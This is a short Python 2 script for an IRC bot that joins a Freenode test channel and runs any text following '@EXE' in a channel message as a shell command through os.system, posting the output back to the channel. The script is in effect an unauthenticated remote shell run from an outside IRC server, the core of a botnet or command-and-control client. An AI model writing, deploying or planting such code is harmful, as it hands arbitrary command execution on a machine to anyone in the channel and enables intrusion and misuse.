#!/usr/bin/python
import socket
import os
import time

#-----Global Variable--------
SERVER = "irc.freenode.net"
PORT = 6667
CHANNEL = "#evshary-test"
NICKNAME = "abc-test"
#----------------------------

echo_flag = True

def connect_to_irc(ircsock):
	print "Now we trying to connect to %s:%d" % (SERVER, PORT)
	try:
		ircsock.connect((SERVER, PORT))
	except socket.error:
		print "There is something wrong with socket...."
	else:
		ircsock.send("USER {0} 0 * {0}\n".format(NICKNAME))
		ircsock.send("NICK {0}\n".format(NICKNAME))
		print "Connect to irc server correctly"

def join_channel(ircsock):
	ircsock.send("JOIN {0}\n".format(CHANNEL))

def send_msg(ircsock, msg):
	ircsock.send("PRIVMSG {0} :{1}\n".format(CHANNEL, msg))

def leave_channel(ircsock):
	send_msg(ircsock, "Bye")
	ircsock.send("PART {0}\n".format(CHANNEL))

def exe_command(ircsock, command):
	global echo_flag
	print command
	os.system("rm tmp")
	os.system("".join([command ,">>tmp"]))
	echo_flag = False
	filename = open("tmp", "r")
	for line in filename.readlines():
		print line,
		send_msg(ircsock, line.strip("\n"))
		time.sleep(1)
	os.system("rm tmp")

def check_command_from_msg(ircsock, msg):
	if msg.find("@Hi?") != -1:
		send_msg(ircsock, "Here")
	elif msg.find("@PART") != -1:
		leave_channel(ircsock)
	elif msg.find("@EXE") != -1:
		try:
			command = " ".join(msg.split()[4:])
			exe_command(ircsock, command)
		except IndexError:
			sendmsg(ircsock, "Invalid syntax: @EXE <command>")

def main():
	global echo_flag
	ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect_to_irc(ircsock)	
	join_channel(ircsock)
	
	while 1:
		if echo_flag:
			msg = ircsock.recv(4096).strip('\n')
			print msg
			check_command_from_msg(ircsock, msg)
		else:
			echo_flag = True

if __name__ == '__main__':
	main()
